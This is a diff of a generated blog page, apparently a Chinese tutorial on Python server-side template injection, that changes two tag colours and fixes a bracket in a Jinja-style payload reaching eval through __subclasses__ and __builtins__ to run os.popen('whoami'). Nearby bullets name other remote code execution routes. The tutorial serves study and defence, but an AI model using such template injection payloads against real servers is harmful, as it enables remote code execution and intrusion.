@@ -184,14 +184,14 @@
             
             <span class="tag">
                 
-                <a href="/tags/Web/" style="color: #ff7d73">
+                <a href="/tags/Web/" style="color: #ffa2c4">
                     Web
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/Py/" style="color: #00a596">
+                <a href="/tags/Py/" style="color: #03a9f4">
                     Py
                 </a>
             </span>
@@ -218,7 +218,7 @@
 <li>利用warnings.catch_warnings配合__builtins__得到eval函数借此进行rce</li>
 </ul>
 <pre><code class="python"># 注意__subclasss__的元素索引需要根据实际修改
-&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()&#125;&#125;
+&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read())&#125;&#125;
 </code></pre>
 <ul>
 <li>利用os._wrap_close类所属空间下可用的popen函数进行RCE</li>
